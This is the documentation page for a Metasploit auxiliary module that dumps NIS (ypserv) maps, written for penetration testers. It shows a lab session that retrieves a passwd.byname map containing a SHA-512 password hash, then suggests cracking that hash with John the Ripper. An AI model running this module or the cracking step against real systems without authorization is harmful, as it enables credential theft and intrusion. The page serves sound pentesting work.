## Intro

If you've worked with old Unix systems before, you've probably
encountered NIS (Network Information Service). The most familiar way of
describing it is a sort of hybrid between DNS and LDAP.

[Oracle][1] says the following about it:

> NIS is a distributed naming service. It is a mechanism for identifying and locating network objects and resources. It provides a uniform storage and retrieval method for network-wide information in a transport-protocol and media-independent fashion.

And on its use:

> By running NIS, the system administrator can distribute administrative databases, called maps, among a variety of servers (master and slaves). The administrator can update those databases from a centralized location in an automatic and reliable fashion to ensure that all clients share the same naming service information in a consistent manner throughout the network.

The module documented within will allow a tester to dump any map from an
NIS server (running as `ypserv`). Usually, maps like `passwd.byname`
contain things like hashes and user info, which can go a long way during
a pentest.

## Setup

Set up NIS as per <https://help.ubuntu.com/community/SettingUpNISHowTo>.
If the link is down, you can find it via the Wayback Machine.

## Options

**PROTOCOL**

Set this to either TCP or UDP. TCP is the default due to easy discovery.

**DOMAIN**

Set this to your NIS domain.

**MAP**

Set this to the NIS map you want to dump. The default is `passwd`. You
can use the nicknames described in the module info instead of the full
map names.

**XDRTimeout**

Set this to the timeout in seconds for XDR decoding of the response.

## Usage

```
msf > use auxiliary/gather/nis_ypserv_map
msf auxiliary(gather/nis_ypserv_map) > set rhost 192.168.0.2
rhost => 192.168.0.2
msf auxiliary(gather/nis_ypserv_map) > set domain gesellschaft
domain => gesellschaft
msf auxiliary(gather/nis_ypserv_map) > run

[+] 192.168.0.2:111 - Dumping map passwd.byname on domain gesellschaft:
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
ubuntu:$6$LXFAVGTO$yiCXi1KjLynOrapuhJE7tKnvdwknDMKiKM7Z8ZB19ht6CHmsS.CbUTm8q0cy5fFHEqA.Sg4Acl.0UtY.Y0JNE1:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
games:*:5:60:games:/usr/games:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
systemd-resolve:*:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
systemd-network:*:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
uuidd:*:108:112::/run/uuidd:/bin/false
dnsmasq:*:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
root:*:0:0:root:/root:/bin/bash
sshd:*:110:65534::/var/run/sshd:/usr/sbin/nologin
systemd-bus-proxy:*:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
messagebus:*:107:111::/var/run/dbus:/bin/false
_apt:*:105:65534::/nonexistent:/bin/false
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
syslog:*:104:108::/home/syslog:/bin/false
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
systemd-timesync:*:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
pollinate:*:111:1::/var/cache/pollinate:/bin/false
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
lxd:*:106:65534::/var/lib/lxd/:/bin/false

[*] Auxiliary module execution completed
msf auxiliary(gather/nis_ypserv_map) >
```

After dumping a map, you can find it stored in `loot` later. You should
be able to run something like John the Ripper directly on the
`passwd.byname` map.

```
msf auxiliary(gather/nis_ypserv_map) > loot

Loot
====

host         service  type           name  content     info  path
----         -------  ----           ----  -------     ----  ----
192.168.0.2           passwd.byname        text/plain        /home/wvu/.msf4/loot/20180108143013_default_192.168.0.2_passwd.byname_509006.txt

msf auxiliary(gather/nis_ypserv_map) >
```

[1]: https://docs.oracle.com/cd/E23824_01/html/821-1455/anis1-25461.html
